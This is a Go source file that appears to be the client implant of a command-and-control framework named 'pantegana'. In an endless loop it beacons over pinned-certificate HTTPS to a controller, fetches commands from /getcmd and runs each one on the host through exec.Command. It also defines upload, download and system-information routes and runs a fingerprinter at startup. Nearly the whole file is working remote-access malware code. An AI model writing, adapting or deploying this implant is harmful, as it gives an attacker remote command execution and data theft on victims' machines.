package client

import (
	"crypto/tls"
	"crypto/x509"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

//go:generate go-bindata -o cert.go ../cert/server.crt

// routes
const getCmdURL = "/getcmd"
const cmdOutputURL = "/cmdoutput"
const uploadFileURL = "/upload"
const downloadFileURL = "/download"
const sysInfoURL = "/sysinfo"

// special errors
var ErrHTTPResponse = errors.New("http: server gave HTTP response to HTTPS client")

// debug
var hasTLS = true

const hasLogs = true

var ClientToken string

func ClientSetup() *http.Client {
	// set up own cert pool
	tlsConfig := &tls.Config{RootCAs: x509.NewCertPool()}
	transport := &http.Transport{TLSClientConfig: tlsConfig}
	client := &http.Client{
		Transport: transport,
		Timeout:   30 * time.Minute,
	}

	// load trusted cert path
	caCert, err := Asset("../cert/server.crt")
	if err != nil {
		panic(err)
	}
	ok := tlsConfig.RootCAs.AppendCertsFromPEM(caCert)
	if !ok {
		panic("Couldn't load cert file")
	}

	return client
}

// RequestCommand sends a HTTPS GET request to the master pantegana server
// /getCmd endpoint and returns the parsed command string.
func RequestCommand(client *http.Client, host string, port int) (string, string) {
	log.Println("[+] Calling home to c2 to get cmd...")

	var httpstr string
	if hasTLS {
		httpstr = "https"
	} else {
		httpstr = "http"
	}

	hoststr := fmt.Sprintf("%s://%s:%d", httpstr, host, port)

	req, err := http.NewRequest("GET", hoststr+getCmdURL, nil)
	if err != nil {
		log.Printf("[-] Error creating the GET request: %s\n", err)
	}

	req.Header.Add("Token", ClientToken)

	resp, err := client.Do(req)
	if err != nil {
		log.Printf("[-] Got error when requesting cmd: %s\nRetrying in 5 seconds...\n", err)
		if err == ErrHTTPResponse {
			hasTLS = false
		}
		time.Sleep(5 * time.Second)
		return RequestCommand(client, host, port)
	}
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Printf("[-] Error while reading body of request: %s", err)
	}
	log.Printf("[+] Got cmd from backend:\n%s\n", body)
	if string(body) == "Client sent an HTTP request to an HTTPS server.\n" {
		hasTLS = true
		defer log.Printf("[+] Retrying with HTTPS...\n")
	}

	defer resp.Body.Close()
	return strings.Trim(string(body), " \n\r"), hoststr
}

// ExecAndGetOutput executes the command string on the OS
// and returns the combined output.
func ExecAndGetOutput(cmdString string) []byte {
	log.Println("[+] Executing cmd...")
	cmdTokens := strings.Split(cmdString, " ")
	log.Println(cmdTokens)
	cmd := exec.Command(cmdTokens[0], cmdTokens[1:]...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		log.Printf("[-] Failed to execute cmd with error: %s\n", err)
		out = []byte("Failed to execute cmd")
	}
	return out
}

func RunClient(host string, port int) {
	// Create token from pseudorandom number generator and convert it to hex (should be sufficient)
	ClientToken = strconv.FormatInt(rand.NewSource(time.Now().UnixNano()).Int63(), 16)

	if !hasLogs {
		log.SetFlags(0)
		log.SetOutput(ioutil.Discard)
	}

	RunFingerprinter()

	client := ClientSetup()

	for {
		cmd, hoststr := RequestCommand(client, host, port)
		Middleware(client, cmd, hoststr)
	}
}
